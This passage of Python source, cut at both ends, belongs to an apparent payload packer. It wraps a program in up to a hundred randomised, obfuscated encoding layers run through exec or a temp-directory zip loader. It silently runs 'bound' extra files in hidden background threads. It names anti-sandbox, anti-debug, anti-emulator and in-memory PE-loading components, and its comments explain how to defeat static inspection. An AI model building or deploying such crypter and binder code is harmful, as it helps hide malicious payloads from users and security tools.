                    j = _struct_randbelow(i + 1)
                    self.enc_map[i], self.enc_map[j] = self.enc_map[j], self.enc_map[i]
                for i in range(255, 0, -1):
                    j = _struct_randbelow(i + 1)
                    self.enc_map[i], self.enc_map[j] = self.enc_map[j], self.enc_map[i]
            self.dec_map = {self.enc_map[i]: i for i in range(256)}
    def morph(self, code_obj, depth=0):
        if sys.version_info >= (3, 11):
            return code_obj
        if depth > 20: return code_obj
        try:
            new_consts = []
            for c in code_obj.co_consts:
                if hasattr(c, 'co_code'): new_consts.append(self.morph(c, depth + 1))
                else: new_consts.append(c)
            ops_indices = set()
            try:
                for instr in dis.get_instructions(code_obj): ops_indices.add(instr.offset)
            except Exception: pass
            raw_code = bytearray(code_obj.co_code)
            for i in range(len(raw_code)):
                if i in ops_indices and raw_code[i] < 256: raw_code[i] = self.enc_map[raw_code[i]]
            return code_obj.replace(co_code=bytes(raw_code), co_consts=tuple(new_consts))
        except Exception: return code_obj
    def get_runtime_map(self): return {self.enc_map[i]: i for i in range(256)}
ZIP_LOADER_TEMPLATE = r'''import sys,os,base64,zipfile,io,tempfile,shutil,atexit,runpy
%(VAR_PAYLOAD)s="%(PAYLOAD_STR)s"
def %(VAR_BOOTSTRAP)s():
    try:
        if "NX_ORIGIN" not in os.environ: os.environ["NX_ORIGIN"] = os.path.abspath(__file__)
        %(VAR_DATA)s=%(DECODE_FUNC)s(%(VAR_PAYLOAD)s)
        %(VAR_TEMP)s=tempfile.mkdtemp(prefix="app_")
        with zipfile.ZipFile(io.BytesIO(%(VAR_DATA)s)) as z: z.extractall(%(VAR_TEMP)s)
        sys.path.insert(0,%(VAR_TEMP)s)
        _nx_owner_pid=os.getpid()
        def %(VAR_CLEAN)s():
            # A forked child inherits this atexit handler.  Without the
            # pid guard the child deletes the directory its PARENT is
            # still executing from, and the parent's later self-check
            # fails closed (ENOENT, exit 137).
            try:
                if os.getpid()==_nx_owner_pid: shutil.rmtree(%(VAR_TEMP)s,ignore_errors=True)
            except:pass
        atexit.register(%(VAR_CLEAN)s)
        %(VAR_MAIN)s=os.path.join(%(VAR_TEMP)s,"__main__.py")
        if os.path.exists(%(VAR_MAIN)s): runpy.run_path(%(VAR_MAIN)s,run_name="__main__")
    except Exception as e:print("Err:",e);input("Press Enter...")
if __name__=="__main__":%(VAR_BOOTSTRAP)s()
'''
EXEC_TEMPLATE = r'''import base64,lzma,zlib,sys,os;
%(VAR_PAYLOAD)s="%(PAYLOAD_STR)s"
try:
    if "NX_ORIGIN" not in os.environ:
        try: os.environ["NX_ORIGIN"] = os.path.abspath(__file__)
        except: os.environ["NX_ORIGIN"] = os.path.abspath(sys.argv[0])
    %(VAR_CODE)s=%(DECODE_FUNC)s(%(VAR_PAYLOAD)s)
    %(VAR_CODE)s=lzma.decompress(%(VAR_CODE)s)
    exec(%(VAR_CODE)s)
except Exception as e:print("Err:",e)
'''
def b64_rot13_enc(data): return codecs.encode(base64.b64encode(data).decode('utf-8'), 'rot13').encode('utf-8')
def b64_swap_enc(data): return base64.b64encode(data).decode('utf-8').swapcase().encode('utf-8')
def xor_b64_enc(data): return base64.b64encode(bytes([b ^ 101 for b in data]))
def b64_alt_enc(data): return base64.b64encode(data).decode('utf-8').replace('+', '.').replace('/', ',').encode('utf-8')
def b85_rot13_enc(data): return codecs.encode(base64.b85encode(data).decode('utf-8'), 'rot13').encode('utf-8')
def zlib_b64_enc(data): return base64.b64encode(zlib.compress(data))
ENCODINGS = {'base64': (base64.b64encode, 'base64.b64decode'),'b85':    (base64.b85encode, 'base64.b85decode'),'a85':    (base64.a85encode, 'base64.a85decode'),'url_b64': (base64.urlsafe_b64encode, 'base64.urlsafe_b64decode'),'xor_b64': (xor_b64_enc, "(lambda s:bytes(b^101 for b in base64.b64decode(s)))"),'b64_alt': (b64_alt_enc, "(lambda s:base64.b64decode(s.replace('.','+').replace(',','/')))"),'b85_rot13': (b85_rot13_enc, "(lambda s:base64.b85decode(__import__('codecs').decode(s,'rot13')))"),'zlib_b64': (zlib_b64_enc, "(lambda s:__import__('zlib').decompress(base64.b64decode(s)))"),'b64_rev': (lambda d: base64.b64encode(d)[::-1], '(lambda s:base64.b64decode(s[::-1]))'),'a85_rev': (lambda d: base64.a85encode(d)[::-1], '(lambda s:base64.a85decode(s[::-1]))'),'b64_rot13': (b64_rot13_enc, "(lambda s:base64.b64decode(__import__('codecs').decode(s,'rot13')))"),'b64_swap': (b64_swap_enc, "(lambda s:base64.b64decode(s.swapcase()))")}
def random_var_name(length=6):
    return "_nixon_" + "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 16)))
def get_best_zip_compression():
    if hasattr(zipfile, 'ZIP_LZMA'): return zipfile.ZIP_LZMA
    return zipfile.ZIP_DEFLATED
def create_initial_layer(source_path, encoding_type, extra_files=None):
    """Zip the payload as ``__main__.py`` plus any ``extra_files``.

    ``extra_files`` is a list of ``(archive_name, path)`` pairs written
    into the same archive.  The loader extracts this archive into a
    fresh temp dir and runs ``__main__.py`` from there, so a file listed
    here lands beside ``__main__.py`` -- which is where the payload's
    FHE/ORAM bootstrap looks for ``nixon_core.so``.
    """
    buffer = io.BytesIO()
    compression = get_best_zip_compression()
    with zipfile.ZipFile(buffer, 'w', compression) as zip_file:
        if os.path.isdir(source_path):
            for root, dirs, files in os.walk(source_path):
                for file in files:
                    full_path = os.path.join(root, file)
                    archive_name = os.path.relpath(full_path, source_path)
                    zip_file.write(full_path, archive_name)
        else:
            zip_file.write(source_path, "__main__.py")
        for archive_name, path in (extra_files or ()):
            if path and os.path.exists(path):
                zip_file.write(path, archive_name)
    return _finalize_zip_layer(buffer.getvalue(), encoding_type)
def create_intermediate_zip_layer(input_code_string, encoding_type, bind_files_list=None):
    buffer = io.BytesIO()
    compression = get_best_zip_compression()
    with zipfile.ZipFile(buffer, 'w', compression) as zip_file:
        main_code = input_code_string
        if bind_files_list:
            inject_header = "import threading, runpy, sys\n"
            inject_body = ""
            for original_name, content in bind_files_list:
                internal_name = f"_sys_{_struct_hex(4)}"
                zip_file.writestr(f"{internal_name}.py", content)
                inject_body += (f"def _run_{internal_name}():\n    try: runpy.run_module('{internal_name}', run_name='__main__')\n    except Exception: pass\ntry: threading.Thread(target=_run_{internal_name}, daemon=True).start()\nexcept Exception: pass\n")
            main_code = inject_header + inject_body + main_code
        zip_file.writestr("__main__.py", main_code)
    return _finalize_zip_layer(buffer.getvalue(), encoding_type)
def _finalize_zip_layer(raw_zip_bytes, encoding_type):
    encode_func = ENCODINGS[encoding_type][0]
    decode_str = ENCODINGS[encoding_type][1]
    encoded_bytes = encode_func(raw_zip_bytes)
    encoded_str = encoded_bytes.decode('utf-8').replace('\\', '\\\\').replace('"', '\\"')
    return ZIP_LOADER_TEMPLATE % {'VAR_PAYLOAD': random_var_name(), 'PAYLOAD_STR': encoded_str,'VAR_BOOTSTRAP': random_var_name(), 'VAR_DATA': random_var_name(),'DECODE_FUNC': decode_str, 'VAR_TEMP': random_var_name(),'VAR_CLEAN': random_var_name(), 'VAR_MAIN': random_var_name()}
def create_exec_layer(input_code_string, encoding_type):
    compressed_data = lzma.compress(input_code_string.encode('utf-8'))
    encode_func = ENCODINGS[encoding_type][0]
    decode_str = ENCODINGS[encoding_type][1]
    encoded_bytes = encode_func(compressed_data)
    encoded_str = encoded_bytes.decode('utf-8').replace('\\', '\\\\').replace('"', '\\"')
    return EXEC_TEMPLATE % {'VAR_PAYLOAD': random_var_name(), 'PAYLOAD_STR': encoded_str,'VAR_CODE': random_var_name(), 'DECODE_FUNC': decode_str}
def recursive_package(initial_source, final_output, layers=100, zip_count=0, bind_paths_list=None, num_layers=None, num_zips=None, extra_files=None):
    if num_layers is not None: layers = num_layers
    if num_zips is not None: zip_count = num_zips
    try:
        layers = int(layers)
    except Exception:
        layers = 1
    if layers < 1: layers = 1
    print(f"[*] Starting recursive packaging ({layers} layers) for {initial_source}...")
    bind_data = []
    if bind_paths_list:
        for bp in bind_paths_list:
            if os.path.exists(bp):
                try:
                    with open(bp, 'rb') as f: bind_data.append((os.path.basename(bp), f.read()))
                    print(f"  [+] Bind loaded: {bp}")
                except Exception as e: print(f"  [!] Skip bind {bp}: {e}")
    if len(bind_data) > 0 and zip_count < 1: zip_count = 1
    if len(bind_data) > 0 and layers <= 2:
        # Binds ride interior zip slots (range(2, layers)); with
        # layers<=2 no slot exists and binds would be silently
        # dropped. Bump to 3 so slot 2 carries them.
        layers = 3
    zip_layer_indices = set()
    if zip_count > 0 and layers > 2:
        available_slots = list(range(2, layers))
        if len(available_slots) >= zip_count:
            selected = []
            remaining = available_slots.copy()
            for _ in range(zip_count):
                idx = _struct_randbelow(len(remaining))
                selected.append(remaining.pop(idx))
            zip_layer_indices = set(selected)
        else: zip_layer_indices = set(available_slots)
    layer_payloads = {}
    sorted_zip_layers = sorted(list(zip_layer_indices))
    if bind_data:
        if len(sorted_zip_layers) > 1 and len(bind_data) > 1:
             print(f"  [*] Distributing {len(bind_data)} files across {len(sorted_zip_layers)} encrypted ZIP layers.")
             for i, (name, content) in enumerate(bind_data):
                 target_layer = sorted_zip_layers[i % len(sorted_zip_layers)]
                 if target_layer not in layer_payloads: layer_payloads[target_layer] = []
                 layer_payloads[target_layer].append((name, content))
        elif len(sorted_zip_layers) > 0: layer_payloads[sorted_zip_layers[0]] = bind_data
    last_encoding = None
    first_enc = _struct_choice(list(ENCODINGS.keys()))
    current_code = create_initial_layer(initial_source, first_enc, extra_files=extra_files)
    last_encoding = first_enc
    size_kb = len(current_code.encode('utf-8')) / 1024
    print(f"  [+] Layer 1 ({first_enc}) [Disk-Mode]: {size_kb:.2f} KB")
    for i in range(2, layers + 1):
        if i == layers: enc_choice = 'base64'
        else:
            available = list(ENCODINGS.keys())
            if last_encoding in available: available.remove(last_encoding)
            if i == layers - 1 and 'base64' in available: available.remove('base64')
            enc_choice = _struct_choice(available)
        mode_str = "Mem-Mode"
        if i in zip_layer_indices:
            payloads = layer_payloads.get(i, None)
            current_code = create_intermediate_zip_layer(current_code, enc_choice, payloads)
            mode_str = f"Disk-Mode (Binds: {len(payloads) if payloads else 0})"
        else: current_code = create_exec_layer(current_code, enc_choice)
        last_encoding = enc_choice
        size_kb = len(current_code.encode('utf-8')) / 1024
        if i % 10 == 0: gc.collect()
        print(f"  [+] Layer {i} ({enc_choice}) [{mode_str}]: {size_kb:.2f} KB")
    with open(final_output, 'w', encoding='utf-8') as f: f.write(current_code)
    print(f"[SUCCESS] Packed payload generated: {final_output}")
    print(f"Total size: {os.path.getsize(final_output)/1024:.2f} KB")
    return current_code.encode('utf-8')
_VARS_MAP = {
    "ANTI_SANDBOX_CLS": "A_SBX",
    "METHOD_CHECK_SLEEP_ACCEL": "CHK_TIME",
    "METHOD_CHECK_RESOURCES": "CHK_HW",
    "METHOD_CHECK_USERNAMES": "CHK_USER",
    "METHOD_FULL_SANDBOX_CHECK": "FULL_SBX",
    "VAR_ANTI_SANDBOX_CLS": "VAR_A_SBX",
    "PAYLOAD": "DATA", "NONCE": "NONCE", "PART_A": "KEY_A", "PART_B": "KEY_B",
    "S0_A": "S0_A", "S0_B": "S0_B", "RECIPE_IN": "LAYERS_IN", "RECIPE_OUT": "LAYERS_OUT",
    "CIPHER_CLS": "XOR_STREAM", "LOADER_CLS": "MEM_LDR", "VM_CLS": "TITAN_VM",
    "HW_LOCK": "HW_ID", "EXP_DATE": "EXP", "STR_TABLE": "STR_TBL", "CHECKSUM": "SIG",
    "ENC_BLOB": "E_BLB", "EK_A": "EK_A", "EK_B": "EK_B", "FUNC_TBL_INIT": "T_INIT", "FUNC_EXTRACT_WIPE": "EX_WP",
    "NET_URL": "URL", "HMAC_SIG": "HMAC", "NATIVE_BLOB": "NATIVE_LIB",
    "TOTAL_PARTS": "PARTS", "FUNC_STR_DEC": "S", "FUNC_CHECK": "CHK",
    "FUNC_ROT": "ROT", "FUNC_REV": "REV", "FUNC_KEY": "KGEN", "FUNC_BOOT": "BOOT",
    "FUNC_DEC_REC": "D_REC", "FUNC_WIPE": "WIPE", "FUNC_VM": "VM",
    "FUNC_HOOK": "HOOK_CHK", "FUNC_JOIN": "JOIN", "FUNC_STAGE0": "STG0",
    "FUNC_PARENT": "P_CHK", "FUNC_MEM": "MEM_CHK", "FUNC_SELF": "SELF",
    "FUNC_NET": "NET", "FUNC_RES": "RES", "FUNC_SEC_MEM": "SEC_MEM",
    "FUNC_TLS_CTX": "TLS_CTX",
    "FUNC_ADV_HK": "ADV_HOOK", "EXC_STATE": "JUMP", "DECOY_FUNC": "DECOY",
    "IS_DEBUG": "DBG", "ENTROPY_MARKER": "MARKER", "FUNC_LOG": "LOG",
    "FUNC_HW_BIND": "HW_BND", "FUNC_HARD": "HARDEN", "CLS_HARD": "KERNEL_HARD",
    "FUNC_PHASE1": "K_P1", "FUNC_PHASE2": "K_P2", "FUNC_DECOY_PROC": "SPAWN_NOISE",
    "FUNC_LIVE_CHK": "MEM_SENTINEL", "FUNC_HEAP_WALK": "HEAP_SCAN",
    "CLS_DECOY_VM": "GHOST_VM", "VM_FACTORY_CLS": "VM_FACT", "NESTED_VM_CLS": "N_VM",
    "INTEGRITY_SALT": "I_SALT",
    "FUNC_DERIVE_INTEGRITY": "K_INT", "FUNC_DERIVE_ENV": "K_ENV",
    "FUNC_UNLOCK_VM": "K_VM", "FUNC_MASK": "MASK", "FUNC_FRIDA": "ANTI_FRIDA",
    "VAR_CANARY_URL": "WEBHOOK", "VAR_FUNC_CANARY": "TRIG", "FUNC_API_HASH": "API",
    "FUNC_ANTMAN": "ANTMAN", "FUNC_RDTSC": "TIME", "FUNC_DOH": "DOH",
    "FUNC_MERKLE_BUILD": "M_BUILD", "FUNC_MERKLE_VERIFY": "M_VERIFY", "FUNC_TRIGGER_ALERT": "ALERT",
    "METHOD_INTEGRITY": "INT_CHK", "METHOD_RUN": "RUN", "METHOD_ANTI_DBG": "A_DBG", "METHOD_ANTI_DUMP": "A_DUMP",
    "METHOD_MIX": "MIX", "METHOD_NOISE": "NOISE", "METHOD_INIT_APIS": "init_apis",
    "METHOD_LOAD_MEM": "load_memory",
    "METHOD_RUN_PE": "run_pe",
    "METHOD_PROC_RELOC": "process_relocations", "METHOD_SECCOMP": "SCMP", "METHOD_LINUX_HARD": "L_HARD",
    "METHOD_PTRACE_SELF": "PT_SELF", "METHOD_CHECK_PARENT": "C_PAR", "METHOD_WIN_DEBUG": "W_DBG",
    "METHOD_THREAD_TIMING": "T_TIM", "METHOD_SYM_DETECT": "S_DET",
    "METHOD_HYPER": "HYPER", "METHOD_MEMFD": "MFD", "METHOD_LOAD": "L_BASE",
    "METHOD_LOAD_PE": "L_PE", "METHOD_LOAD_ELF": "L_ELF", "METHOD_LOAD_DYLIB": "L_DYLIB",
    "METHOD_WIPE_MOD": "W_MOD", "METHOD_WIPE_ALL": "W_ALL", "METHOD_INSTALL_HOOK": "I_HOOK",
    "METHOD_LEN_X64": "L_X64", "METHOD_CHECK": "CHK_S", "METHOD_VALIDATE": "VAL",
    "METHOD_EXEC_IMPL": "EXEC_I", "METHOD_T": "T",
    "WHITEBOX_CLS": "WB_AES", "IO_ENCODER_CLS": "IO_ENC", "DUAL_CIPHER_CLS": "DUAL_C",
    "METHOD_ENCODE_INPUT": "ENC_IN", "METHOD_DECODE_OUTPUT": "DEC_OUT",
    "METHOD_WB_ROUND": "WB_RND",
    "METHOD_IO_ENCODE": "IO_E", "METHOD_IO_DECODE": "IO_D",
    "METHOD_DUAL_ENCRYPT": "DL_E", "METHOD_DUAL_DECRYPT": "DL_D",
    "OPAQUE_CONST_CLS": "OP_CONST", "DECOY_DECRYPT_CLS": "DCY_DEC",
    "METHOD_CPU_TEMP": "CPU_T", "METHOD_ENTROPY_INJECT": "ENT_INJ",
    "METHOD_TIME_BRANCH": "T_BRANCH", "METHOD_OPAQUE_PRED": "OP_PRED",
    "METHOD_DECOY_DEC": "DCY_D", "METHOD_BATCH_FAKE": "BATCH_F",
    "METHOD_TRACE_STEP": "TR_STEP", "METHOD_TRACE_BRANCH": "TR_BR",
    "METHOD_TRACE_OBFUSCATE": "TR_OBF", "METHOD_TRACE_VERIFY": "TR_VER",
    "DYNAMIC_MORPH_CLS": "DYN_MORPH", "FRAME_ANTI_DEBUG_CLS": "FRM_AD",
    "GC_ANTI_DUMP_CLS": "GC_AD", "JIT_AST_CLS": "JIT_AST", "BYTECODE_PAGING_CLS": "BC_PAGE",
    "METHOD_GET_MAP": "G_MAP", "METHOD_WIPE_HISTORY": "W_HIST",
    "METHOD_MORPH_CODE": "M_CODE", "METHOD_RESTORE_CODE": "R_CODE",
    "METHOD_CHECK_FRAME": "C_FRM", "METHOD_CORRUPT_FRAME": "CRP_FRM", "METHOD_SAFE_EXEC": "S_EXEC",
    "METHOD_TRACK_OBJ": "TR_OBJ", "METHOD_CHECK_REFS": "C_REFS",
    "METHOD_FORCE_COLLECT": "F_GC", "METHOD_CLEANUP_TRACKED": "CLN_TR",
    "METHOD_ENCRYPT_AST": "E_AST", "METHOD_JIT_COMPILE": "JIT_C", "METHOD_EXEC_JIT": "E_JIT",
    "METHOD_LOAD_BYTECODE": "L_BC", "METHOD_FETCH_PAGE": "F_PAGE", "METHOD_CLEAR_ACTIVE": "C_ACT",
    "ANTI_DECOMPILER_CLS": "A_DECOMP", "PROGRESSIVE_DECRYPT_CLS": "PROG_DEC",
    "METHOD_BREAK_CFG": "B_CFG", "METHOD_FAKE_IMPORTS": "F_IMP", "METHOD_MASSIVE_EXPR": "M_EXPR",
    "METHOD_INIT_LAYERS": "I_LYRS", "METHOD_WRAP_DATA": "W_DATA",
    "METHOD_UNWRAP_LAYER": "UW_LYR", "METHOD_FULL_UNWRAP": "F_UW",
    "WATERMARK_CLS": "WTRMK", "TRAITOR_TRACE_CLS": "TR_TRC",
    "METHOD_INFLUENCE_VM": "INF_VM", "METHOD_INFLUENCE_STRINGS": "INF_STR",
    "METHOD_INFLUENCE_ORDER": "INF_ORD", "METHOD_EMBED_MARKER": "EM_MK", "METHOD_VERIFY_MARKER": "V_MK",
    "METHOD_GET_ERROR_MSG": "G_ERR", "METHOD_GET_TIMING": "G_TIM",
    "METHOD_GET_CONSTANT": "G_CONST", "METHOD_IDENTIFY": "IDENT",
    "ENV_KEYING_CLS": "ENV_KEY", "METHOD_COLLECT_ALL": "COLL_HW",
    "METHOD_FUZZY_MATCH": "F_MATCH", "METHOD_DERIVE_KEY": "D_KEY",
    "QUANTUM_CRYPTO_CLS": "Q_CRYPTO", "SECURE_ENCLAVE_CLS": "SEC_ENC", "HEAP_ENCRYPT_CLS": "HEAP_ENC",
    "TOTP_CLS": "TOTP_AUTH",
    "INTEGRITY_MON_CLS": "INT_MON", "ANTI_EMULATOR_CLS": "A_EMU",
    "METHOD_GEN_POLY": "G_POLY", "METHOD_POLY_MUL": "P_MUL", "METHOD_POLY_ADD": "P_ADD",
    "METHOD_GEN_KEYS": "G_KEYS", "METHOD_ENCRYPT": "ENC", "METHOD_DECRYPT": "DEC",
    "METHOD_ALLOC_ENCLAVE": "A_ENC", "METHOD_SEAL_DATA": "SEAL",
    "METHOD_UNSEAL_DATA": "UNSEAL", "METHOD_ATTEST": "ATTEST", "METHOD_VERIFY_ATTEST": "V_ATT",
    "METHOD_REGISTER_FUNC": "R_FUNC", "METHOD_VERIFY_FUNC": "V_FUNC",
    "METHOD_CROSS_VERIFY": "X_VER", "METHOD_START_MONITOR": "S_MON",
    "METHOD_STOP_MONITOR": "ST_MON", "METHOD_GET_VIOLATIONS": "G_VIO",
    "METHOD_CHECK_RDRAND": "C_RDR", "METHOD_CACHE_TIMING": "C_TIM",
    "METHOD_MEM_ALLOC_SPEED": "M_SPD", "METHOD_CPUID_HYPERVISOR": "CPUID_H",
    "METHOD_CHECK_VM_ARTIFACTS": "C_VMA", "METHOD_FULL_CHECK": "F_CHK",
    "CODE_SIGN_CLS": "CODE_SIG", "NN_OBF_CLS": "NN_OBF", "BLOCKCHAIN_LIC_CLS": "BC_LIC",
    "RUNTIME_MUTATE_CLS": "RT_MUT", "GEOFENCE_CLS": "GEO_F",
    "HW_PERF_CLS": "HW_PERF", "KEY_SHARD_CLS": "K_SHARD",
    "METHOD_SIGN_STATE": "S_STATE", "METHOD_REMOTE_VERIFY": "R_VER", "METHOD_LOCAL_ATTEST": "L_ATT",
    "METHOD_NN_ENCRYPT": "NN_E", "METHOD_NN_DECRYPT": "NN_D", "METHOD_NN_TRANSFORM_ARRAY": "NN_TR",
    "METHOD_CHECK_LICENSE": "C_LIC", "METHOD_VERIFY_OWNERSHIP": "V_OWN",
    "METHOD_MUTATE_FUNC": "MUT_F", "METHOD_RESTORE_FUNC": "RST_F", "METHOD_GET_MUTATION_LOG": "G_MUT",
    "METHOD_GET_LOCATION": "G_LOC", "METHOD_CHECK_ALLOWED": "C_ALW", "METHOD_GET_LOCATION_KEY": "G_LK",
    "METHOD_CPU_BENCH": "CPU_B", "METHOD_MEM_BANDWIDTH": "MEM_BW", "METHOD_HASH_BENCH": "H_BENCH",
    "METHOD_GET_FINGERPRINT": "G_FP", "METHOD_VERIFY_SIMILAR": "V_SIM",
    "METHOD_SPLIT_KEY": "SPL_K", "METHOD_RECONSTRUCT": "RECON",
    "METHOD_FETCH_SHARDS": "F_SHR", "METHOD_DISTRIBUTE_SHARDS": "D_SHR",
    "FUNC_FETCH_CRITICAL": "FETCH_CRITICAL",
    "TIMING_SIDECHAIN_CLS": "TIM_SC", "METHOD_TIMING_BENCH": "T_BENCH", "METHOD_TIMING_CHECK": "T_CHK",
    "BYTECODE_PATCHER_CLS": "BC_PATCH", "METHOD_PATCH_MODULE": "P_MOD", "METHOD_UNPATCH_FUNC": "UP_FN",
    "METHOD_GC_POISON_STORE": "GC_P_S", "METHOD_GC_POISON_RETRIEVE": "GC_P_R",
    "CHIMERIC_JIT_CLS": "CJT", "METHOD_JIT_XOR": "JIT_X",
    "GHOST_FUNC_CLS": "GHF", "METHOD_GHOST_REGISTER": "GH_REG", "METHOD_GHOST_INVOKE": "GH_INV",
    "SELF_MORPH_CLS": "SM_G", "METHOD_MORPH_DISPATCH": "SM_DSP",
    "MULTIDIM_CLS": "MD_E", "METHOD_MULTIDIM_ENCODE": "MD_EN", "METHOD_MULTIDIM_DECODE": "MD_DE",
    "ISR_ENCODER_CLS": "ISR_E", "METHOD_ISR_INIT": "ISR_I", "METHOD_ISR_ENCODE": "ISR_EN", "METHOD_ISR_DECODE": "ISR_DE",
    "STACK_CFI_CLS": "ST_CFI", "METHOD_CFI_INIT": "CFI_I", "METHOD_CFI_PUSH": "CFI_P", "METHOD_CFI_POP": "CFI_PO", "METHOD_CFI_DEPTH": "CFI_D",
    "EXEC_TRACE_CLS": "EX_TR", "METHOD_TRACE_UPDATE": "TR_UPD", "METHOD_TRACE_CHECKPOINT": "TR_CHP", "METHOD_TRACE_RESET": "TR_RST", "METHOD_TRACE_VIOLATED": "TR_VIO",
    "MEM_RANDOMIZER_CLS": "MEM_R", "METHOD_MEM_RANDOMIZE": "MEM_RND", "METHOD_MEM_SCRAMBLE_LAYOUT": "MEM_SCR",
    "POLY_CONST_CLS": "PL_C", "METHOD_POLY_STORE": "PL_ST", "METHOD_POLY_SOLVE": "PL_SLV", "METHOD_POLY_VERIFY": "PL_VER",
    "TIMING_KEY_CLS": "TK", "METHOD_TIMING_INIT": "TK_I", "METHOD_TIMING_RECORD": "TK_R", "METHOD_TIMING_DERIVE": "TK_D", "METHOD_TIMING_WINDOW_OK": "TK_WOK",
    "NON_DETERM_CLS": "ND_E", "METHOD_ND_REGISTER": "ND_REG", "METHOD_ND_EXECUTE": "ND_EXE", "METHOD_ND_VARIANT_COUNT": "ND_VC",
    "PROACTIVE_CORRUPT_CLS": "PC_C", "METHOD_PC_CORRUPT": "PC_CR", "METHOD_PC_REPAIR": "PC_RP", "METHOD_PC_DERIVE_PROOF": "PC_DP",
    "QUINE_CHECK_CLS": "QN_C", "METHOD_QUINE_INIT": "QN_I", "METHOD_QUINE_VERIFY": "QN_V", "METHOD_QUINE_GET_CORRUPTION": "QN_GC",
    "METAMORPHIC_CLS": "MT_C", "METHOD_META_WRAP": "MT_W", "METHOD_META_RESTORE": "MT_R",
    "QUANTUM_ENTANGLE_CLS": "QE_C", "METHOD_QE_SET": "QE_S", "METHOD_QE_GET": "QE_G", "METHOD_QE_COLLAPSED": "QE_CO",
    "TEMPORAL_LOGIC_CLS": "TL_C", "METHOD_TL_MARK": "TL_M", "METHOD_TL_CHECK": "TL_CK", "METHOD_TL_VIOLATED": "TL_VIO", "METHOD_TL_ELAPSED": "TL_EL",
    "COMMITMENT_CLS": "CM_C", "METHOD_CMT_COMMIT": "CM_CO", "METHOD_CMT_REVEAL": "CM_RV", "METHOD_CMT_VERIFY": "CM_VR", "METHOD_CMT_IS_BOUND": "CM_IB",
    "GORDIAN_KNOT_CLS": "GK_C", "METHOD_GK_REGISTER": "GK_REG", "METHOD_GK_DERIVE_KEY": "GK_DK", "METHOD_GK_VERIFY": "GK_VER", "METHOD_GK_DECRYPT": "GK_DEC",
    "CUSTOM_VM_CLS": "CVM_C", "METHOD_VM_COMPILE": "CVM_CMP", "METHOD_VM_EXECUTE": "CVM_EXE", "METHOD_VM_RESET": "CVM_RST",
    "WHITEBOX_CRYPTO_CLS": "WB_C", "METHOD_WB_INIT": "WB_I", "METHOD_WB_ENCRYPT": "WB_ENC", "METHOD_WB_DECRYPT": "WB_DEC",
    "SHAPESHIFTER_CLS": "SS_C", "METHOD_SS_INIT": "SS_I", "METHOD_SS_PROTECT": "SS_P", "METHOD_SS_IS_ACTIVE": "SS_IA",
    "NANOMITE_GUARD_CLS": "NM_C", "METHOD_NM_ACTIVATE": "NM_ACT", "METHOD_NM_IS_GUARDED": "NM_IG", "METHOD_NM_GET_KEY": "NM_GK",
    "LOGIC_ENTANGLE_CLS": "LE_C", "METHOD_LE_INIT": "LE_I", "METHOD_LE_COMPUTE": "LE_CP", "METHOD_LE_VERIFY_ZERO": "LE_VZ", "METHOD_LE_BIND": "LE_BD", "METHOD_LE_CORRECTION": "LE_CR",
    "ROLLING_ISA_CLS": "RI_C", "METHOD_RISA_EXECUTE": "RI_EXE", "METHOD_RISA_RESET": "RI_RST", "METHOD_RISA_GET_CONTEXT": "RI_GC",
    "WHITEBOX_ENHANCED_CLS": "WBE_C", "METHOD_WBE_INIT": "WBE_I", "METHOD_WBE_ENCRYPT": "WBE_E", "METHOD_WBE_DECRYPT": "WBE_D",
    "TEMPORAL_DEGRADE_CLS": "TD_C", "METHOD_TD_INJECT_ANOMALY": "TD_IA", "METHOD_TD_APPLY": "TD_AP", "METHOD_TD_COMPOUND": "TD_CM", "METHOD_TD_CHECK_ENV": "TD_CE", "METHOD_TD_IS_DEGRADED": "TD_ID",
    "CODE_BLOAT_CLS": "CB_C", "METHOD_CB_INIT": "CB_I", "METHOD_CB_GENERATE": "CB_G", "METHOD_CB_COUNT": "CB_CT",
    "CROSS_PLATFORM_GUARD_CLS": "XP_G", "METHOD_WIN_DEBUG_BLOCK": "XP_WDB", "METHOD_MAC_DENY_ATTACH": "XP_MDA", "METHOD_ANDROID_TRACE_SCAN": "XP_ATS", "METHOD_UNIVERSAL_GUARD": "XP_UG",
    "ATTRITION_CLS": "AW_C", "METHOD_LOG_EXPLOSION": "AW_LE", "METHOD_PROOF_OF_WORK": "AW_POW", "METHOD_STATEFUL_ENTANGLE": "AW_SE", "METHOD_RDTSC_FLOOD": "AW_RF"
,
    "FHE_CLS": "_nixon_" + __import__('secrets').token_hex(4),
    "ORAM_CLS": "_nixon_" + __import__('secrets').token_hex(4),
    "SYNTH_CLS": "_nixon_" + __import__('secrets').token_hex(4),
    "FAULT_CLS": "_nixon_" + __import__('secrets').token_hex(4),
}
VARS = {k: get_random_var_name(v) for k, v in _VARS_MAP.items()}
VARS["MAGIC"] = b"NIXON_ENC"
VARS["STR_KEY"] = _struct_randbelow(255) + 1
# Hardening A2.1: per-build ASCII token for the payload-part globals.
# Parts are emitted as "<token><i>" and the loader's join template rebuilds
# the very same name, so a static reader can no longer locate the assembled
# payload chunks by grepping the fixed "_NX_PART_" signature.  Two
# constraints force the shape:
#   * the token must start with "_" so the renamer's underscore guard
#     (transforms.get_new_name / visit_Name / Encoder.visit_Name) leaves the
#     part globals alone -- renaming emission but not the f-string join would
#     silently break reassembly with "[FATAL] Payload corrupted";
#   * it must be ASCII, because get_random_var_name() returns Unicode Babel
#     identifiers that are unusable as a literal inside the join f-string.
VARS["PART_PREFIX"] = "_" + secrets.token_hex(6)
# Hardening A2.2/A2.3: per-build name token for the loader's fixed runtime
# markers (_nx_kill, _NX_AUDIT_*).  Applied once on the assembled loader by
# obfuscator.marker_names.rename_markers(); see that module for why the
# substitution happens there and not in each emitter.
VARS["MARKER_TOKEN"] = secrets.token_hex(5)
VARS.update({
    "FUNC_NEXT_H": FUNC_NEXT_H,
    "FUNC_REM_ENT": FUNC_REM_ENT,
    "FUNC_SEC_WIPE": FUNC_SEC_WIPE,
    "FUNC_PROT_EXEC": FUNC_PROT_EXEC,
    "FUNC_GC_SHIELD": FUNC_GC_SHIELD,
    "FUNC_GC_RESTORE": FUNC_GC_RESTORE,
    "FUNC_HIDE_OBJ": FUNC_HIDE_OBJ,
    "FUNC_FAKE_ENC": FUNC_FAKE_ENC,
    "FUNC_FAKE_DEC": FUNC_FAKE_DEC,
    "FUNC_DECOY_XFORM": FUNC_DECOY_XFORM,
    "FUNC_PIPE_WRAP": FUNC_PIPE_WRAP,
    "FUNC_STACK_XOR": FUNC_STACK_XOR,
    "FUNC_STATE_INIT": FUNC_STATE_INIT,
    "FUNC_STATE_STG0": FUNC_STATE_STG0,
